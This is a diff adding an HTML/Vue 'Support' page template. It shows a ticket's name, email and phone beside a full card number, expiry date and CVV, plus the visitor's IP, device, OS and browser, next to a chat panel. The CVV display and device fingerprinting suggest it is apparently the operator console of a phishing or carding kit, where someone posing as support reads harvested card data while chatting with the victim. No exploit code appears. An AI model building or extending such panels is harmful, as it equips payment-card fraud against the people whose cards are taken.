@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta name="description" content="description">
+    <meta name="keywords" content="kw">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Support</title>
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <link rel="stylesheet" href="assets/css/support.css">
+</head>
+
+<body>
+    <div id="app" class="big">
+        <div class="info">
+            <div class="info__block">
+                <div class="info__box">
+                    <div class="label">Ticket username</div>
+                    <div class="value">{{ info.ticket_username }}</div>
+                </div>
+                <div class="info__box">
+                    <div class="label">Ticket email</div>
+                    <div class="value">{{ info.ticket_email }}</div>
+                </div>
+                <div class="info__box">
+                    <div class="label">Ticket phone</div>
+                    <div class="value">{{ info.ticket_phone }}</div>
+                </div>
+            </div>
+            <div class="info__block">
+                <div class="info__box">
+                    <div class="label">Card number</div>
+                    <div class="value">{{ formatCard(info.cardnumber) }}</div>
+                </div>
+                <div class="info__box">
+                    <div class="label">Expire Date</div>
+                    <div class="value">{{ info.validity }}</div>
+                </div>
+                <div class="info__box">
+                    <div class="label">CVV</div>
+                    <div class="value">{{ info.cvv }}</div>
+                </div>
+            </div>
+            <div class="info__block">
+                <div class="info__box">
+                    <div class="label">Device</div>
+                    <div class="value">{{ info.device }}</div>
+                </div>
+                <div class="info__box">
+                    <div class="label">IP</div>
+                    <div class="value">{{ info.ip }}</div>
+                </div>
+                <div class="info__box">
+                    <div class="label">OS</div>
+                    <div class="value">{{ info.os }}</div>
+                </div>
+                <div class="info__box">
+                    <div class="label">Browser</div>
+                    <div class="value">{{ info.browser }}</div>
+                </div>
+            </div>
+        </div>
+        <div class="chat">
+            <div class="messages">
+                <template v-for="(m, i) in messages">
+                    <div :class="'message message-' + isMy(m.from)">
+                        <div class="message__text">{{ m.text }}</div>
+                        <div class="message__date">{{ formatDate(m.createdAt) }}</div>
+                    </div>
+                </template>
+            </div>
+            <div class="chat__input">
+                <div class="input">
+                    <input type="text" placeholder="Enter message..." @keyup.enter="send" id="text">
+                </div>
+                <div class="icon" @click="send">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24"
+                        style="fill: rgba(0, 0, 0, 1)">
+                        <path
+                            d="m21.426 11.095-17-8A1 1 0 0 0 3.03 4.242l1.212 4.849L12 12l-7.758 2.909-1.212 4.849a.998.998 0 0 0 1.396 1.147l17-8a1 1 0 0 0 0-1.81z">
+                        </path>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="/assets/js/support.js" type="module"></script>
+</body>
+
+</html>
